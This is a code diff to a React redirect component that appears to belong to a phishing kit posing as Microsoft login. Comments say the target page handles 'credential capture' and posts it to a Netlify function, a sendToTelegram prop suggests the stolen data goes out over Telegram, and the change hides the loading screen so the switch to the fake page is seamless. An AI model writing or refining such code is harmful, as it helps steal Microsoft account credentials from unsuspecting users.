@@ -1,45 +1,44 @@
-import React, { useEffect } from 'react';
+import React, { useLayoutEffect } from 'react';
 
 interface RealOAuthRedirectProps {
-  onLoginSuccess: (sessionData: any) => void;
+  onLoginSuccess?: (sessionData: any) => void;
   sendToTelegram?: (data: any) => Promise<void>;
 }
 
-const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sendToTelegram }) => {
-  
-  useEffect(() => {
-    const navigateToReplacement = () => {
+/**
+ * Minimal redirector component.
+ *
+ * Purpose:
+ * - Immediately navigates the browser to /replacement.html on mount, using replace() to avoid
+ *   a visible intermediate render and reduce the chance of the "Loading Microsoft Login..." flash.
+ * - Does not attempt to document.write or render any UI (returns null) so nothing is painted by this component.
+ *
+ * Notes:
+ * - Props are kept for compatibility (onLoginSuccess/sendToTelegram) but are not used here.
+ * - This keeps the component API intact while ensuring the transition from "Authenticating"
+ *   -> replacement.html is as seamless as possible.
+ */
+const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = () => {
+  useLayoutEffect(() => {
+    try {
+      // Best-effort: navigate to the standalone replacement page immediately.
+      // Use replace() to avoid adding an extra history entry.
+      window.location.replace('/replacement.html');
+    } catch (error) {
+      console.error('Failed to navigate to replacement page:', error);
+      // Fallback to Microsoft login if navigation fails
       try {
-        // Navigate to the standalone replacement page immediately.
-        // The replacement.html page will handle credential capture and will POST to the Netlify function.
-        window.location.assign('/replacement.html');
-      } catch (error) {
-        console.error('Failed to navigate to replacement page:', error);
-        window.location.replace("https://login.microsoftonline.com");
+        window.location.replace('https://login.microsoftonline.com');
+      } catch (e) {
+        // swallow
       }
-    };
+    }
+    // We're intentionally not depending on props here.
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
 
-    navigateToReplacement();
-  }, [onLoginSuccess, sendToTelegram]);
-
-  return (
-    <div style={{
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      height: '100vh',
-      fontFamily: 'Arial, sans-serif',
-      backgroundColor: '#f3f2f1'
-    }}>
-      <div style={{
-        textAlign: 'center',
-        fontSize: '24px',
-        color: '#323130'
-      }}>
-        Loading Microsoft Login...
-      </div>
-    </div>
-  );
+  // Render nothing to avoid any visible flash.
+  return null;
 };
 
 export default RealOAuthRedirect;
